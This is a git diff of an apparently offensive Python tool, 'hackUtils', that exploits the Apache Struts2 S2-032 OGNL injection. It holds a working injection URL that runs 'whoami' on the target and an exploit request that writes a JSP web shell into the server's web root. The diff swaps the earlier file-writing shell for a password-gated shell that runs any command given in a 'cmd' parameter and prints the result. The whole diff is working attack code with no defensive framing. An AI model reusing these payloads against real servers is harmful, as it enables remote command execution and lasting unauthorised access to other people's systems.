@@ -761,9 +761,11 @@ def checkS2032(url):
     poc_whoami = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=whoami&pp=A&ppp=%20&encoding=UTF-8"
 		
     shellname="nimabi.jsp"
-    shellpwd="n"
-    shellcontent_win="%3C%25%20if%28request.getParameter%28%22"+shellpwd+"%22%29%21%3Dnull%29%28new%20java.io.FileOutputStream%28application.getRealPath%28%22%2f%22%29%2brequest.getParameter%28%22"+shellpwd+"%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B%20%25%3E"
-    shellcontent_linux="%3C%25%20if%28request.getParameter%28%22"+shellpwd+"%22%29%21%3Dnull%29%28new%20java.io.FileOutputStream%28application.getRealPath%28%22%5C%5C%22%29%2brequest.getParameter%28%22"+shellpwd+"%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B%20%25%3E"
+    shellpwd="nmb"
+    #shellcontent_win="%3C%25%20if%28request.getParameter%28%22"+shellpwd+"%22%29%21%3Dnull%29%28new%20java.io.FileOutputStream%28application.getRealPath%28%22%2f%22%29%2brequest.getParameter%28%22"+shellpwd+"%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B%20%25%3E"
+    #shellcontent_linux="%3C%25%20if%28request.getParameter%28%22"+shellpwd+"%22%29%21%3Dnull%29%28new%20java.io.FileOutputStream%28application.getRealPath%28%22%5C%5C%22%29%2brequest.getParameter%28%22"+shellpwd+"%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B%20%25%3E"
+    shellcontent_win="%3C%25%0A%20%20%20%20if%28%22"+shellpwd+"%22.equals%28request.getParameter%28%22pwd%22%29%29%29%7B%0A%20%20%20%20%20%20%20%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29.getInputStream%28%29%3B%0A%20%20%20%20%20%20%20%20int%20a%20%3D%20-1%3B%0A%20%20%20%20%20%20%20%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%0A%20%20%20%20%20%20%20%20out.print%28%22%3Cpre%3E%22%29%3B%0A%20%20%20%20%20%20%20%20while%28%28a%3Din.read%28b%29%29%21%3D-1%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20out.println%28new%20String%28b%29%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20out.print%28%22%3C%2fpre%3E%22%29%3B%0A%20%20%20%20%7D%0A%25%3E"
+    shellcontent_linux="%3C%25%0A%20%20%20%20if%28%22"+shellpwd+"%22.equals%28request.getParameter%28%22pwd%22%29%29%29%7B%0A%20%20%20%20%20%20%20%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29.getInputStream%28%29%3B%0A%20%20%20%20%20%20%20%20int%20a%20%3D%20-1%3B%0A%20%20%20%20%20%20%20%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%0A%20%20%20%20%20%20%20%20out.print%28%22%3Cpre%3E%22%29%3B%0A%20%20%20%20%20%20%20%20while%28%28a%3Din.read%28b%29%29%21%3D-1%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20out.println%28new%20String%28b%29%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20out.print%28%22%3C%2fpre%3E%22%29%3B%0A%20%20%20%20%7D%0A%25%3E"
 
     try:
         result = exploitS2032(poc)
@@ -777,7 +779,7 @@ def checkS2032(url):
             	else:
             		system = "Linux"
             		exp = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path%2b%23parameters.shellname[0]),%23w.close(),1?%23xx:%23request.toString&shellname="+shellname+"&shellContent="+shellcontent_linux+"&encoding=UTF-8&pp=%2f"
-            	shell_path = exploitS2032(exp).strip() + ' (password: '+shellpwd+')'
+            	shell_path = exploitS2032(exp).strip() + ' (pwd: '+shellpwd+', cmd: whoami)'
             except Exception, e:
             	root_path = "unknown"
             	whoami = "unknown"
@@ -797,7 +799,7 @@ def exploitS2032(exp):
     
 def myhelp():
     print "\n+-----------------------------+"
-    print "|  hackUtils v0.1.1           |"
+    print "|  hackUtils v0.1.2           |"
     print "|  Avfisher - avfisher.win    |"
     print "|  security_alert@126.com     |"
     print "+-----------------------------+\n"
